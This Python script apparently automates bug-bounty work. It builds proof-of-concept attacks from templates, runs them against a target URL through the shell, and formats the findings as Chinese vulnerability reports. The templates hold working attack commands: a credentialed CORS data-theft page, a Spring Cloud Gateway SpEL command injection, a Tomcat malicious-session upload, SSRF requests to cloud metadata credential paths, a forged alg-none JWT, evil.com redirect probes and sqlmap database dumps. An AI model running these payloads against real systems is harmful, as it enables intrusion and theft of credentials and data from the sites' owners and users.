#!/usr/bin/env python3
"""
Auto PoC Generator & Report Pipeline v1.0
自动化PoC生成、验证和报告管道

用法:
  auto-poc-report.py generate <vuln_type> --target <url> --param <param>
  auto-poc-report.py verify <poc_file>
  auto-poc-report.py report <graph_dir> [--format butian|md|json]
  auto-poc-report.py quality-gate <report_file>
  auto-poc-report.py chain <graph_dir> --target <url>
"""

import json
import os
import sys
import subprocess
import hashlib
import re
import sqlite3
from datetime import datetime, timezone
from pathlib import Path
import argparse

# === PoC Templates ===
POC_TEMPLATES = {
    "cors_reflected": {
        "title": "CORS配置不当导致跨域数据窃取",
        "severity": "medium",
        "verify_cmd": 'curl -sk -H "Origin: https://evil.com" "{target}" -D- 2>/dev/null | grep -i "access-control-allow-origin"',
        "exploit_html": """<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS Data Theft PoC</h2>
<div id="result"></div>
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "{target}", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
  if (xhr.readyState == 4) {{
    document.getElementById("result").innerHTML = "<pre>" + xhr.responseText + "</pre>";
  }}
}};
xhr.send();
</script>
</body>
</html>""",
        "impact": "攻击者可利用CORS配置不当窃取用户敏感数据（如个人信息、Token等）",
        "fix": "配置CORS白名单，仅允许受信任域名访问；避免使用通配符*且同时开启credentials"
    },
    "actuator_unauth": {
        "title": "Spring Boot Actuator未授权访问",
        "severity": "high",
        "verify_cmd": 'curl -sk "{target}/actuator/env" -o /dev/null -w "%{{http_code}}"',
        "exploit_cmd": 'curl -sk "{target}/actuator/env"',
        "impact": "攻击者可读取应用配置（数据库连接、密钥等），可能导致RCE",
        "fix": "限制Actuator端点访问，仅允许内部管理网络；配置management.endpoints.web.exposure.include"
    },
    "info_leak_env": {
        "title": "环境配置文件泄露",
        "severity": "medium",
        "verify_cmd": 'curl -sk "{target}/.env" -o /dev/null -w "%{{http_code}}"',
        "exploit_cmd": 'curl -sk "{target}/.env"',
        "impact": "泄露数据库密码、API密钥等敏感配置",
        "fix": "禁止Web目录存放.env文件；配置Web服务器拒绝访问隐藏文件"
    },
    "info_leak_git": {
        "title": "Git仓库信息泄露",
        "severity": "high",
        "verify_cmd": 'curl -sk "{target}/.git/config" -o /dev/null -w "%{{http_code}}"',
        "exploit_cmd": 'curl -sk "{target}/.git/config"',
        "impact": "攻击者可恢复完整源代码，发现更多漏洞",
        "fix": "部署时删除.git目录；配置Web服务器拒绝访问.git路径"
    },
    "swagger_unauth": {
        "title": "Swagger/API文档未授权访问",
        "severity": "low",
        "verify_cmd": 'curl -sk "{target}/swagger-ui.html" -o /dev/null -w "%{{http_code}}"',
        "exploit_cmd": 'curl -sk "{target}/swagger-ui.html"',
        "impact": "泄露API接口信息，降低攻击门槛",
        "fix": "生产环境禁用Swagger UI；或配置认证访问"
    },
    "sqli_error": {
        "title": "SQL注入漏洞",
        "severity": "critical",
        "verify_cmd": 'sqlmap -u "{target}" --batch --level=2 --risk=2 --timeout=10 2>/dev/null | tail -20',
        "exploit_cmd": 'sqlmap -u "{target}" --batch --dbs --timeout=10 2>/dev/null',
        "impact": "攻击者可执行任意SQL语句，窃取或篡改数据库数据",
        "fix": "使用参数化查询；部署WAF；最小权限数据库账号"
    },
    "idor": {
        "title": "越权访问漏洞(IDOR)",
        "severity": "high",
        "verify_cmd": 'curl -sk "{target}" -H "Cookie: {cookie}"',
        "impact": "攻击者可越权访问其他用户的数据",
        "fix": "服务端校验用户权限；不依赖客户端传入的ID判断权限"
    },
    "cas_open_redirect": {
        "title": "CAS统一认证开放重定向漏洞",
        "severity": "high",
        "verify_cmd": 'curl -sk "{target}/cas/login?service=https://evil.com" -D- -o /dev/null',
        "impact": "攻击者可构造恶意链接窃取CAS Ticket，冒充用户登录",
        "fix": "配置CAS service参数白名单校验"
    },
    "weak_password": {
        "title": "弱密码/默认凭据",
        "severity": "high",
        "verify_cmd": 'curl -sk -X POST "{target}" -d "username={user}&password={pass}"',
        "impact": "攻击者可使用弱密码登录系统",
        "fix": "强制密码复杂度；禁用默认凭据"
    },
    "file_upload": {
        "title": "任意文件上传漏洞",
        "severity": "critical",
        "verify_cmd": 'curl -sk -X POST "{target}" -F "file=@/tmp/test.txt"',
        "impact": "攻击者可上传恶意文件获取服务器权限",
        "fix": "校验文件类型和内容；禁止执行上传目录的脚本"
    },
    "ssrf": {
        "title": "服务端请求伪造(SSRF)",
        "severity": "high",
        "verify_cmd": 'curl -sk "{target}?url=http://127.0.0.1:80"',
        "impact": "攻击者可利用服务器发起内网请求，探测内网资产或读取云元数据",
        "fix": "限制请求目标白名单；禁止请求内网地址"
    },
    "security_header_missing": {
        "title": "安全响应头缺失",
        "severity": "low",
        "verify_cmd": 'curl -sk -D- "{target}" -o /dev/null | grep -iE "strict-transport|x-frame|x-content-type|content-security-policy"',
        "impact": "缺少安全头可能被利用进行点击劫持、MIME嗅探等攻击",
        "fix": "配置HSTS、X-Frame-Options、X-Content-Type-Options、CSP等安全头"
    },

    # ===== 2025-2026 新增漏洞模板 =====

    "tomcat_put_deser": {
        "title": "Apache Tomcat PUT反序列化RCE (CVE-2025-24813)",
        "severity": "critical",
        "verify_cmd": 'curl -sk -X PUT "{target}/../../sessions/test.session" -d "test" -w "%{{http_code}}"',
        "exploit_cmd": 'curl -sk -X PUT "{target}/../../sessions/malicious.session" -H "Content-Type: application/octet-stream" --data-binary @payload.ser && curl -sk "{target}/" -H "Cookie: JSESSIONID=malicious"',
        "impact": "攻击者可通过PUT上传恶意.session文件触发反序列化，获得服务器RCE权限",
        "fix": "禁用Tomcat partial PUT；不使用文件-backed Session持久化；升级Tomcat到最新版本"
    },
    "nextjs_middleware_bypass": {
        "title": "Next.js中间件认证绕过 (CVE-2025-29927)",
        "severity": "critical",
        "verify_cmd": 'curl -sk "{target}/admin" -H "x-middleware-subrequest: middleware" -w "\\n%{{http_code}}"',
        "impact": "攻击者可通过伪造内部中间件头绕过认证/授权逻辑，访问受保护资源",
        "fix": "升级Next.js到修复版本；不信任客户端传递的内部头；在中间件中验证请求来源"
    },
    "spring_cloud_gateway_spel": {
        "title": "Spring Cloud Gateway SpEL RCE (CVE-2025-41243)",
        "severity": "critical",
        "verify_cmd": 'curl -sk "{target}/actuator/gateway/routes" -o /dev/null -w "%{{http_code}}"',
        "exploit_cmd": 'curl -sk -X POST "{target}/actuator/gateway/routes/hacktest" -H "Content-Type: application/json" -d \'{{\"id\":\"hacktest\",\"filters\":[{{\"name\":\"AddResponseHeader\",\"args\":{{\"name\":\"Result\",\"value\":\"#{{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{{\\\"id\\\"}}).getInputStream()))}}\"}}}}],\"uri\":\"http://example.com\"}}\'',
        "impact": "攻击者可通过Gateway路由配置注入SpEL表达式执行任意命令",
        "fix": "升级Spring Cloud Gateway；限制Actuator端点访问；配置Gateway路由白名单"
    },
    "graphql_introspection": {
        "title": "GraphQL Introspection未授权访问",
        "severity": "medium",
        "verify_cmd": 'curl -sk -X POST "{target}/graphql" -H "Content-Type: application/json" -d \'{{\"query\":\"{{ __schema {{ types {{ name }} }} }}\"}}\' | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get(\'data\',{{}}).get(\'__schema\',{{}}).get(\'types\',[])))" 2>/dev/null',
        "impact": "攻击者可获取完整API Schema，发现隐藏字段和敏感类型",
        "fix": "生产环境禁用introspection；配置查询深度/复杂度限制"
    },
    "graphql_batch_query": {
        "title": "GraphQL批量查询导致数据泄露",
        "severity": "medium",
        "verify_cmd": 'curl -sk -X POST "{target}/graphql" -H "Content-Type: application/json" -d \'[{{\"query\":\"{{ user(id:1) {{ email }} }}\"}},{{\"query\":\"{{ user(id:2) {{ email }} }}\"}}]\'',
        "impact": "攻击者可通过批量查询绕过速率限制，枚举用户数据",
        "fix": "禁用批量查询；配置查询复杂度限制；实现速率限制"
    },
    "jwt_alg_none": {
        "title": "JWT算法None绕过",
        "severity": "critical",
        "verify_cmd": 'curl -sk "{target}" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0." -o /dev/null -w "%{{http_code}}"',
        "impact": "攻击者可伪造任意JWT Token，冒充任意用户或提升权限",
        "fix": "强制验证JWT算法；禁止none算法；使用RS256替代HS256"
    },
    "jwt_key_confusion": {
        "title": "JWT HS/RS密钥混淆攻击",
        "severity": "critical",
        "verify_cmd": 'curl -sk "{target}" -H "Authorization: Bearer TEST_TOKEN" -D- -o /dev/null | grep -i "www-authenticate\\|x-jwt"',
        "impact": "攻击者可用公钥做HMAC签名绕过JWT验证",
        "fix": "明确指定和验证JWT算法；不使用公钥做HMAC密钥"
    },
    "oauth_redirect_uri": {
        "title": "OAuth2 redirect_uri未校验",
        "severity": "high",
        "verify_cmd": 'curl -sk "{target}/auth?client_id=test&redirect_uri=https://evil.com&response_type=code" -D- -o /dev/null | grep -i "location.*evil.com"',
        "impact": "攻击者可窃取OAuth授权码，冒充用户登录",
        "fix": "严格校验redirect_uri白名单；禁止通配符匹配"
    },
    "race_condition": {
        "title": "竞态条件漏洞",
        "severity": "high",
        "verify_cmd": 'for i in $(seq 1 20); do curl -sk -X POST "{target}" -d "action=transfer&amount=100" & done; wait',
        "impact": "攻击者可通过并发请求绕过业务限制（如重复使用优惠券、余额双花等）",
        "fix": "使用分布式锁；实现幂等性校验；数据库事务隔离"
    },
    "mass_assignment": {
        "title": "批量赋值/隐藏参数注入",
        "severity": "high",
        "verify_cmd": 'curl -sk -X POST "{target}" -H "Content-Type: application/json" -d \'{{\"username\":\"test\",\"role\":\"admin\",\"is_admin\":true}}\'',
        "impact": "攻击者可通过添加隐藏参数提升权限或修改业务逻辑",
        "fix": "使用白名单绑定参数；不直接将请求参数映射到数据库模型"
    },
    "subdomain_takeover": {
        "title": "子域名接管漏洞",
        "severity": "high",
        "verify_cmd": 'dig +short CNAME {target} 2>/dev/null',
        "impact": "攻击者可接管子域名，进行钓鱼攻击或窃取Cookie",
        "fix": "删除指向不存在资源的DNS记录；定期审计CNAME记录"
    },
    "ssrf_cloud_metadata": {
        "title": "SSRF访问云元数据",
        "severity": "critical",
        "verify_cmd": 'curl -sk "{target}?url=http://169.254.169.254/latest/meta-data/" -o /dev/null -w "%{{http_code}}"',
        "exploit_cmd": 'curl -sk "{target}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
        "impact": "攻击者可获取云服务临时凭据，控制整个云环境",
        "fix": "限制请求目标白名单；禁止访问元数据地址；使用IMDSv2"
    },
    "container_escape": {
        "title": "容器逃逸风险",
        "severity": "critical",
        "verify_cmd": 'cat /proc/1/cgroup 2>/dev/null | grep -c "docker\\|kubepods"',
        "impact": "攻击者可从容器逃逸到宿主机，控制整个集群",
        "fix": "不使用privileged模式；限制capabilities；不挂载docker.sock"
    }
}

# === Quality Gate Rules ===
QUALITY_GATE_RULES = {
    "must_have": [
        "title", "domain", "vuln_type", "severity", "url", "detail",
        "reproduction_steps", "impact", "fix"
    ],
    "reject_patterns": [
        r"HTTP 404",
        r"HTTP 401",
        r"HTTP 403(?!.*(?:unauth|bypass))",
        r"SPA fallback",
        r"默认页面",
        r"版本号泄露$",
        r"jQuery \d+\.\d+",
        r"TRACE.*enabled",
        r"robots\.txt.*内网",
        r"OPTIONS.*enabled",
    ],
    "severity_rules": {
        "critical": ["rce", "sqli", "file_upload", "deserialization"],
        "high": ["auth_bypass", "idor", "ssrf", "cas_open_redirect", "weak_password", "info_leak_git", "actuator_unauth"],
        "medium": ["cors_reflected", "info_leak_env", "xss"],
        "low": ["swagger_unauth", "security_header_missing", "version_leak"]
    },
    "evidence_required": {
        "critical": ["request", "response", "impact_demo"],
        "high": ["request", "response"],
        "medium": ["request", "response_headers"],
        "low": ["screenshot"]
    }
}


class PoCGenerator:
    """Automated PoC generation and verification."""

    def __init__(self, outdir: str):
        self.outdir = Path(outdir)
        self.outdir.mkdir(parents=True, exist_ok=True)

    def generate(self, vuln_type: str, target: str, param: str = None,
                 cookie: str = None, user: str = None, passw: str = None) -> dict:
        """Generate PoC for given vulnerability type."""
        template = POC_TEMPLATES.get(vuln_type)
        if not template:
            print(f"[!] Unknown vuln type: {vuln_type}")
            print(f"    Available: {', '.join(POC_TEMPLATES.keys())}")
            return {}

        # Build PoC
        poc = {
            "type": vuln_type,
            "title": template["title"],
            "severity": template["severity"],
            "target": target,
            "param": param,
            "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
            "verify_cmd": template.get("verify_cmd", "").format(
                target=target, param=param or "", cookie=cookie or "",
                user=user or "admin", passw=passw or "admin"
            ),
            "exploit_cmd": template.get("exploit_cmd", "").format(
                target=target, param=param or ""
            ) if template.get("exploit_cmd") else None,
            "exploit_html": template.get("exploit_html", "").format(
                target=target
            ) if template.get("exploit_html") else None,
            "impact": template["impact"],
            "fix": template["fix"]
        }

        # Save PoC
        poc_file = self.outdir / f"poc_{vuln_type}_{hashlib.md5(target.encode()).hexdigest()[:8]}.json"
        with open(poc_file, 'w') as f:
            json.dump(poc, f, indent=2, ensure_ascii=False)

        # Generate curl command
        curl_cmd = poc["verify_cmd"]
        poc["curl_command"] = curl_cmd

        return poc

    def verify(self, poc_file: str) -> dict:
        """Execute PoC verification."""
        with open(poc_file) as f:
            poc = json.load(f)

        result = {
            "poc_type": poc["type"],
            "target": poc["target"],
            "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
            "verified": False,
            "evidence": {}
        }

        cmd = poc.get("verify_cmd")
        if not cmd:
            result["error"] = "No verify command"
            return result

        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True,
                                 text=True, timeout=30)
            stdout = proc.stdout
            stderr = proc.stderr

            result["evidence"]["stdout"] = stdout[:2000]
            result["evidence"]["stderr"] = stderr[:500]
            result["evidence"]["exit_code"] = proc.returncode

            # Analyze result based on vuln type
            vuln_type = poc["type"]

            if vuln_type == "cors_reflected":
                if "evil.com" in stdout.lower() or "access-control-allow-origin" in stdout.lower():
                    result["verified"] = True
                    acao = re.search(r'access-control-allow-origin:\s*(.+)', stdout, re.I)
                    acac = re.search(r'access-control-allow-credentials:\s*(.+)', stdout, re.I)
                    result["evidence"]["acao"] = acao.group(1).strip() if acao else None
                    result["evidence"]["acac"] = acac.group(1).strip() if acac else None

            elif vuln_type in ("actuator_unauth", "info_leak_env", "info_leak_git", "swagger_unauth"):
                if "200" in stdout or len(stdout) > 100:
                    result["verified"] = True

            elif vuln_type == "sqli_error":
                if "injectable" in stdout.lower() or "sqlmap" in stdout.lower():
                    result["verified"] = True

            elif vuln_type == "cas_open_redirect":
                if "location:" in stdout.lower() and "evil.com" in stdout.lower():
                    result["verified"] = True

            else:
                # Generic: non-empty response with non-error code
                if proc.returncode == 0 and len(stdout) > 10:
                    result["verified"] = True

        except subprocess.TimeoutExpired:
            result["error"] = "Timeout after 30s"
        except Exception as e:
            result["error"] = str(e)

        # Save verification result
        verify_file = self.outdir / f"verify_{poc['type']}_{hashlib.md5(poc['target'].encode()).hexdigest()[:8]}.json"
        with open(verify_file, 'w') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)

        return result

    def batch_generate(self, graph_dir: str) -> list:
        """Generate PoCs for all vulns in target graph."""
        graph_db = Path(graph_dir) / "target_graph.db"
        if not graph_db.exists():
            print(f"[!] Graph not found: {graph_db}")
            return []

        conn = sqlite3.connect(graph_db)
        c = conn.cursor()

        c.execute("""SELECT vuln_id, host, port, service, severity, cve, title,
                     exploit_available, poc FROM vulns WHERE verified=0""")
        vulns = c.fetchall()
        conn.close()

        pocs = []
        for vuln in vulns:
            vuln_id, host, port, service, severity, cve, title, exploit_avail, existing_poc = vuln

            # Map vuln to PoC type
            poc_type = self._map_vuln_to_poc_type(title, vuln_id)
            if not poc_type:
                continue

            scheme = "https" if port == 443 else "http"
            target = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"

            poc = self.generate(poc_type, target)
            if poc:
                poc["vuln_id"] = vuln_id
                poc["graph_host"] = host
                poc["graph_port"] = port
                pocs.append(poc)

        # Save batch result
        batch_file = self.outdir / "batch_pocs.json"
        with open(batch_file, 'w') as f:
            json.dump(pocs, f, indent=2, ensure_ascii=False)

        print(f"[+] Generated {len(pocs)} PoCs")
        return pocs

    def _map_vuln_to_poc_type(self, title: str, vuln_id: str) -> str:
        """Map vulnerability title/id to PoC type."""
        title_lower = (title or "").lower()
        vid_lower = (vuln_id or "").lower()

        mappings = [
            (["cors", "跨域"], "cors_reflected"),
            (["actuator", "spring boot"], "actuator_unauth"),
            ([".env", "环境配置"], "info_leak_env"),
            ([".git", "git"], "info_leak_git"),
            (["swagger", "api文档"], "swagger_unauth"),
            (["sql", "注入", "sqli"], "sqli_error"),
            (["idor", "越权", "unauthorized"], "idor"),
            (["cas", "open redirect", "重定向"], "cas_open_redirect"),
            (["弱密码", "default", "默认"], "weak_password"),
            (["upload", "上传"], "file_upload"),
            (["ssrf", "请求伪造"], "ssrf"),
            (["安全头", "security header"], "security_header_missing"),
            (["tomcat", "put反序列化"], "tomcat_put_deser"),
            (["nextjs", "中间件绕过", "middleware"], "nextjs_middleware_bypass"),
            (["gateway", "spel", "spring cloud"], "spring_cloud_gateway_spel"),
            (["graphql", "内省", "introspection"], "graphql_introspection"),
            (["graphql", "批量查询", "batch"], "graphql_batch_query"),
            (["jwt", "alg:none", "算法none"], "jwt_alg_none"),
            (["jwt", "密钥混淆", "key confusion"], "jwt_key_confusion"),
            (["oauth", "redirect_uri", "重定向"], "oauth_redirect_uri"),
            (["竞态", "race", "并发"], "race_condition"),
            (["批量赋值", "mass assignment", "隐藏参数"], "mass_assignment"),
            (["子域名接管", "subdomain takeover", "cname"], "subdomain_takeover"),
            (["云元数据", "169.254", "metadata"], "ssrf_cloud_metadata"),
            (["容器逃逸", "container escape", "docker"], "container_escape"),
        ]

        for keywords, poc_type in mappings:
            if any(kw in title_lower or kw in vid_lower for kw in keywords):
                return poc_type

        return None


class ReportPipeline:
    """Automated report generation pipeline."""

    def __init__(self, outdir: str):
        self.outdir = Path(outdir)
        self.outdir.mkdir(parents=True, exist_ok=True)

    def generate_report(self, graph_dir: str, fmt: str = "butian") -> str:
        """Generate report from target graph."""
        graph_db = Path(graph_dir) / "target_graph.db"
        if not graph_db.exists():
            return "[!] Graph not found"

        conn = sqlite3.connect(graph_db)
        c = conn.cursor()

        # Get verified vulns
        c.execute("""SELECT vuln_id, host, port, service, severity, cve, title,
                     description, poc, exploit_available
                     FROM vulns WHERE verified=1
                     ORDER BY CASE severity
                       WHEN 'critical' THEN 1 WHEN 'high' THEN 2
                       WHEN 'medium' THEN 3 WHEN 'low' THEN 4 ELSE 5 END""")
        verified = c.fetchall()

        # Get unverified high-value candidates
        c.execute("""SELECT vuln_id, host, port, service, severity, cve, title,
                     description, poc, exploit_available
                     FROM vulns WHERE verified=0 AND severity IN ('critical', 'high')
                     ORDER BY cvss DESC LIMIT 10""")
        candidates = c.fetchall()

        conn.close()

        if fmt == "butian":
            return self._format_butian(verified, candidates, graph_dir)
        elif fmt == "md":
            return self._format_markdown(verified, candidates, graph_dir)
        elif fmt == "json":
            return self._format_json(verified, candidates, graph_dir)

    def _format_butian(self, verified, candidates, graph_dir):
        """Format reports in Butian (补天) style."""
        reports = []
        for vuln in verified:
            vuln_id, host, port, service, severity, cve, title, desc, poc, exploit = vuln
            scheme = "https" if port == 443 else "http"
            url = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"

            report = f"""===报告===

标题: {title}

域名: {host}

漏洞类型: {self._map_severity_to_type(title, severity)}

危害等级: {self._cn_severity(severity)}

行业: (按目标填写)

地址: (按目标精确到区填写)

URL: {url}

漏洞详情:
{desc or title}

复现步骤:
1. 访问 {url}
2. {poc or '执行验证命令'}

复现命令:
{poc or f'curl -sk "{url}"'}

漏洞影响:
{POC_TEMPLATES.get(self._map_vuln_type(title), {}).get('impact', '可能导致敏感信息泄露或系统被入侵')}

修复建议:
{POC_TEMPLATES.get(self._map_vuln_type(title), {}).get('fix', '请联系系统管理员修复')}

【截图位置1】验证请求和响应
"""
            reports.append(report)

        return "\n===\n".join(reports) if reports else "[!] No verified vulns to report"

    def _format_markdown(self, verified, candidates, graph_dir):
        """Format as Markdown report."""
        lines = [
            "# 渗透测试报告",
            f"生成时间: {datetime.now(timezone.utc).isoformat()}Z",
            f"图谱目录: {graph_dir}",
            "",
            "## 已验证漏洞",
            ""
        ]

        for vuln in verified:
            vuln_id, host, port, service, severity, cve, title, desc, poc, exploit = vuln
            lines.extend([
                f"### {title}",
                f"- **严重性**: {severity}",
                f"- **主机**: {host}:{port}",
                f"- **CVE**: {cve or 'N/A'}",
                f"- **描述**: {desc or 'N/A'}",
                f"- **PoC**: `{poc or 'N/A'}`",
                ""
            ])

        if candidates:
            lines.extend(["## 候选漏洞（待验证）", ""])
            for vuln in candidates:
                vuln_id, host, port, service, severity, cve, title, desc, poc, exploit = vuln
                lines.extend([
                    f"### {title}",
                    f"- **严重性**: {severity}",
                    f"- **主机**: {host}:{port}",
                    ""
                ])

        return "\n".join(lines)

    def _format_json(self, verified, candidates, graph_dir):
        """Format as JSON."""
        def row_to_dict(row):
            return {
                "vuln_id": row[0], "host": row[1], "port": row[2],
                "service": row[3], "severity": row[4], "cve": row[5],
                "title": row[6], "description": row[7], "poc": row[8],
                "exploit_available": row[9]
            }

        report = {
            "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
            "graph_dir": graph_dir,
            "verified_vulns": [row_to_dict(r) for r in verified],
            "candidates": [row_to_dict(r) for r in candidates],
            "summary": {
                "total_verified": len(verified),
                "total_candidates": len(candidates),
                "by_severity": {}
            }
        }

        for r in verified:
            sev = r[4]
            report["summary"]["by_severity"][sev] = report["summary"]["by_severity"].get(sev, 0) + 1

        out_file = self.outdir / "report.json"
        with open(out_file, 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        return json.dumps(report, indent=2, ensure_ascii=False)

    def quality_gate(self, report_text: str) -> dict:
        """Run quality gate on report text."""
        result = {
            "pass": True,
            "score": 100,
            "issues": [],
            "warnings": []
        }

        # Check required fields
        for field in QUALITY_GATE_RULES["must_have"]:
            cn_fields = {
                "title": ["标题"], "domain": ["域名"], "vuln_type": ["漏洞类型"],
                "severity": ["危害等级", "等级"], "url": ["URL", "url"],
                "detail": ["漏洞详情", "详情"], "reproduction_steps": ["复现步骤", "复现"],
                "impact": ["漏洞影响", "影响"], "fix": ["修复建议", "修复"]
            }
            aliases = cn_fields.get(field, [field])
            if not any(a in report_text for a in aliases):
                result["issues"].append(f"Missing required field: {field}")
                result["score"] -= 10
                result["pass"] = False

        # Check for reject patterns
        for pattern in QUALITY_GATE_RULES["reject_patterns"]:
            if re.search(pattern, report_text, re.IGNORECASE):
                result["warnings"].append(f"Contains reject pattern: {pattern}")
                result["score"] -= 5

        # Check for single-line curl
        if "curl" in report_text:
            curl_lines = [l for l in report_text.split('\n') if 'curl' in l and '-sk' in l]
            for cl in curl_lines:
                if len(cl) > 500:
                    result["warnings"].append(f"Curl command too long ({len(cl)} chars): consider simplifying")

        result["score"] = max(0, result["score"])
        return result

    def _map_severity_to_type(self, title, severity):
        title_lower = (title or "").lower()
        if "cors" in title_lower: return "跨域资源共享配置不当"
        if "注入" in title_lower or "sqli" in title_lower: return "SQL注入"
        if "xss" in title_lower: return "XSS跨站脚本"
        if "actuator" in title_lower: return "未授权访问"
        if "信息泄露" in title_lower or "info" in title_lower: return "信息泄露"
        if "认证" in title_lower or "auth" in title_lower: return "认证绕过"
        if "越权" in title_lower or "idor" in title_lower: return "越权访问"
        if "上传" in title_lower: return "文件上传"
        if "重定向" in title_lower: return "URL重定向"
        return "其他"

    def _map_vuln_type(self, title):
        title_lower = (title or "").lower()
        # Keyword-based mapping (same as _map_vuln_to_poc_type)
        mappings = [
            (["cors", "跨域"], "cors_reflected"),
            (["actuator", "spring boot"], "actuator_unauth"),
            ([".env", "环境配置"], "info_leak_env"),
            ([".git", "git"], "info_leak_git"),
            (["swagger", "api文档"], "swagger_unauth"),
            (["sql", "注入", "sqli"], "sqli_error"),
            (["idor", "越权", "unauthorized"], "idor"),
            (["cas", "open redirect", "重定向"], "cas_open_redirect"),
            (["弱密码", "default", "默认"], "weak_password"),
            (["upload", "上传"], "file_upload"),
            (["ssrf", "请求伪造"], "ssrf"),
            (["安全头", "security header"], "security_header_missing"),
            (["tomcat", "put反序列化"], "tomcat_put_deser"),
            (["nextjs", "中间件绕过", "middleware"], "nextjs_middleware_bypass"),
            (["gateway", "spel", "spring cloud"], "spring_cloud_gateway_spel"),
            (["graphql", "内省", "introspection"], "graphql_introspection"),
            (["graphql", "批量查询", "batch"], "graphql_batch_query"),
            (["jwt", "alg:none", "算法none"], "jwt_alg_none"),
            (["jwt", "密钥混淆", "key confusion"], "jwt_key_confusion"),
            (["oauth", "redirect_uri", "重定向"], "oauth_redirect_uri"),
            (["竞态", "race", "并发"], "race_condition"),
            (["批量赋值", "mass assignment", "隐藏参数"], "mass_assignment"),
            (["子域名接管", "subdomain takeover", "cname"], "subdomain_takeover"),
            (["云元数据", "169.254", "metadata"], "ssrf_cloud_metadata"),
            (["容器逃逸", "container escape", "docker"], "container_escape"),
        ]
        for keywords, poc_type in mappings:
            if any(kw in title_lower for kw in keywords):
                return poc_type
        return "info_leak_env"

    def _cn_severity(self, sev):
        return {"critical": "严重", "high": "高危", "medium": "中危", "low": "低危"}.get(sev, "未知")


def main():
    parser = argparse.ArgumentParser(description="Auto PoC & Report Pipeline v1.0")
    sub = parser.add_subparsers(dest="command")

    # generate
    p_gen = sub.add_parser("generate")
    p_gen.add_argument("vuln_type")
    p_gen.add_argument("--target", required=True)
    p_gen.add_argument("--param")
    p_gen.add_argument("--cookie")
    p_gen.add_argument("--outdir", default="/tmp/auto_poc")

    # verify
    p_ver = sub.add_parser("verify")
    p_ver.add_argument("poc_file")
    p_ver.add_argument("--outdir", default="/tmp/auto_poc")

    # report
    p_rep = sub.add_parser("report")
    p_rep.add_argument("graph_dir")
    p_rep.add_argument("--format", choices=["butian", "md", "json"], default="butian")
    p_rep.add_argument("--outdir", default="/tmp/auto_poc")

    # quality-gate
    p_qg = sub.add_parser("quality-gate")
    p_qg.add_argument("report_file")
    p_qg.add_argument("--outdir", default="/tmp/auto_poc")

    # chain
    p_chain = sub.add_parser("chain")
    p_chain.add_argument("graph_dir")
    p_chain.add_argument("--target")
    p_chain.add_argument("--outdir", default="/tmp/auto_poc")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    if args.command == "generate":
        gen = PoCGenerator(args.outdir)
        poc = gen.generate(args.vuln_type, args.target, args.param, args.cookie)
        if poc:
            print(f"\n{'='*50}")
            print(f"  PoC GENERATED: {poc['type']}")
            print(f"{'='*50}")
            print(f"  Title: {poc['title']}")
            print(f"  Severity: {poc['severity']}")
            print(f"  Target: {poc['target']}")
            print(f"  Verify: {poc['verify_cmd'][:120]}")
            print(f"  Impact: {poc['impact'][:100]}")
            print(f"{'='*50}")

    elif args.command == "verify":
        gen = PoCGenerator(args.outdir)
        result = gen.verify(args.poc_file)
        status = "VERIFIED" if result["verified"] else "NOT VERIFIED"
        print(f"\n[{status}] {result['poc_type']} @ {result['target']}")
        if result.get("evidence"):
            print(f"  Evidence: {str(result['evidence'])[:200]}")

    elif args.command == "report":
        pipeline = ReportPipeline(args.outdir)
        report = pipeline.generate_report(args.graph_dir, args.format)
        if args.format == "butian":
            print(report)

    elif args.command == "quality-gate":
        with open(args.report_file) as f:
            text = f.read()
        pipeline = ReportPipeline(args.outdir)
        result = pipeline.quality_gate(text)
        print(f"\nQuality Gate: {'PASS' if result['pass'] else 'FAIL'}")
        print(f"Score: {result['score']}/100")
        for issue in result["issues"]:
            print(f"  [!] {issue}")
        for warn in result["warnings"]:
            print(f"  [~] {warn}")

    elif args.command == "chain":
        gen = PoCGenerator(args.outdir)
        pipeline = ReportPipeline(args.outdir)
        pocs = gen.batch_generate(args.graph_dir)
        print(f"[+] Generated {len(pocs)} PoCs")
        report = pipeline.generate_report(args.graph_dir, "butian")
        if report:
            print(report)


if __name__ == "__main__":
    main()
